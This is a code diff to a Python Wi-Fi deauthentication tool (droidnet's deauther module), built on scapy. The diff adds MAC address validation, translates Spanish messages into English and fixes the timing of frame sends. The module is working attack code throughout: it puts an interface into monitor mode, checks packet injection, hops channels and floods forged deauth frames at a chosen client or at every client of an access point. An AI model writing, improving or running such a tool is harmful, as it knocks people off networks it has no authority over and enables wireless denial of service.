@@ -19,6 +19,7 @@ Requires:
     pip install scapy
 """
 
+import re
 import shutil
 import subprocess
 import sys
@@ -42,6 +43,13 @@ except ImportError:
     _SCAPY_OK = False
 
 BROADCAST = "ff:ff:ff:ff:ff:ff"
+
+_MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
+
+
+def _valid_mac(mac: str) -> bool:
+    """True if *mac* is a well-formed colon-separated 48-bit MAC address."""
+    return bool(_MAC_RE.match(mac))
 
 
 def _check_monitor_mode(iface: str) -> bool:
@@ -188,66 +196,76 @@ def deauth_target(
                      performed in bg over 1/6/11.
     """
     if not _SCAPY_OK:
-        rprint("[red][✗] Scapy no instalado. pip install scapy[/red]")
+        rprint("[red][✗] Scapy not installed. pip install scapy[/red]")
         return
 
     if not check_root():
-        rprint("[red][✗] Necesitas root.[/red]")
+        rprint("[red][✗] Root required.[/red]")
+        return
+
+    if not _valid_mac(bssid):
+        rprint(f"[red][✗] Invalid BSSID: {bssid}[/red]")
+        return
+    if target_mac != BROADCAST and not _valid_mac(target_mac):
+        rprint(f"[red][✗] Invalid target MAC: {target_mac}[/red]")
         return
 
     we_enabled_monitor = False
     if not _check_monitor_mode(iface):
-        rprint(f"[yellow][!][/yellow] {iface} no está en monitor mode.")
+        rprint(f"[yellow][!][/yellow] {iface} is not in monitor mode.")
         if not _enable_monitor(iface):
-            rprint(f"[bold red][✗] No se pudo activar monitor mode en {iface}.[/bold red]")
-            rprint("[dim]En Android: tu chip WiFi probablemente no soporta esto.\n"
-                   "Solución: Alfa AWUS036ACH por OTG, o corre desde una RPi/Kali.[/dim]")
+            rprint(f"[bold red][✗] Could not enable monitor mode on {iface}.[/bold red]")
+            rprint("[dim]On Android: your WiFi chip probably does not support this.\n"
+                   "Workaround: Alfa AWUS036ACH over OTG, or run from a RPi/Kali.[/dim]")
             return
         we_enabled_monitor = True
 
     # Injection test — only if we have aireplay-ng. Otherwise, we continue.
     injection = _injection_supported(iface)
     if injection is False:
-        rprint("[bold red][✗] El chipset NO soporta inyección de paquetes.[/bold red]")
-        rprint("[dim]aireplay-ng --test reportó fallo. Cambia de adaptador WiFi.[/dim]")
+        rprint("[bold red][✗] The chipset does NOT support packet injection.[/bold red]")
+        rprint("[dim]aireplay-ng --test reported failure. Switch WiFi adapter.[/dim]")
         if we_enabled_monitor:
             _disable_monitor(iface)
         return
     if injection is True:
-        rprint("[green][✓][/green] Inyección verificada con aireplay-ng.")
+        rprint("[green][✓][/green] Injection verified with aireplay-ng.")
     else:
-        rprint("[dim][·] aireplay-ng no instalado; saltando test de inyección.[/dim]")
+        rprint("[dim][·] aireplay-ng not installed; skipping injection test.[/dim]")
 
     # Channel hopping if no explicit channel is specified.
     hopper: _ChannelHopper | None = None
     if channel is not None:
         if _set_channel(iface, channel):
-            rprint(f"[dim][·] Canal fijado a {channel}.[/dim]")
+            rprint(f"[dim][·] Channel set to {channel}.[/dim]")
         else:
-            rprint(f"[yellow][!][/yellow] No pude fijar canal {channel}; intentando igualmente.")
+            rprint(f"[yellow][!][/yellow] Could not set channel {channel}; trying anyway.")
     else:
-        rprint(f"[dim][·] Channel hopping {_DEFAULT_HOP_CHANNELS} cada "
+        rprint(f"[dim][·] Channel hopping {_DEFAULT_HOP_CHANNELS} every "
                f"{_DEFAULT_HOP_INTERVAL}s.[/dim]")
         hopper = _ChannelHopper(iface)
         hopper.start()
 
     frame          = _build_deauth(target_mac, bssid)
-    target_display = "BROADCAST (todos)" if target_mac == BROADCAST else target_mac
+    target_display = "BROADCAST (all)" if target_mac == BROADCAST else target_mac
 
-    rprint(f"\n[bold red][☠][/bold red] Deauth iniciado")
-    rprint(f"  Objetivo  : [cyan]{target_display}[/cyan]")
+    rprint(f"\n[bold red][☠][/bold red] Deauth started")
+    rprint(f"  Target    : [cyan]{target_display}[/cyan]")
     rprint(f"  AP (BSSID): [cyan]{bssid}[/cyan]")
-    rprint(f"  Interfaz  : [cyan]{iface}[/cyan]")
-    rprint(f"  Ctrl+C para detener.\n")
+    rprint(f"  Interface : [cyan]{iface}[/cyan]")
+    rprint(f"  Ctrl+C to stop.\n")
 
     sent = 0
     try:
         while count == 0 or sent < count:
-            sendp(frame, iface=iface, verbose=False, inter=interval)
+            # sendp(inter=) only spaces packets within a single call, so pace
+            # the per-frame sends here instead.
+            sendp(frame, iface=iface, verbose=False)
             sent += 1
-            rprint(f"  [dim][→] Frames enviados: {sent}[/dim]", end="\r")
+            rprint(f"  [dim][→] Frames sent: {sent}[/dim]", end="\r")
+            time.sleep(interval)
     except KeyboardInterrupt:
-        rprint(f"\n[bold yellow][!][/bold yellow] Detenido. {sent} frames en total.")
+        rprint(f"\n[bold yellow][!][/bold yellow] Stopped. {sent} frames total.")
     finally:
         if hopper:
             hopper.stop()
@@ -257,7 +275,7 @@ def deauth_target(
 
 if __name__ == "__main__":
     if len(sys.argv) < 4:
-        rprint("[yellow]Uso: python -m droidnet.modules.deauther <MAC|broadcast> <BSSID> <IFACE>[/yellow]")
+        rprint("[yellow]Usage: python -m droidnet.modules.deauther <MAC|broadcast> <BSSID> <IFACE>[/yellow]")
         sys.exit(1)
 
     _target = BROADCAST if sys.argv[1].lower() == "broadcast" else sys.argv[1]
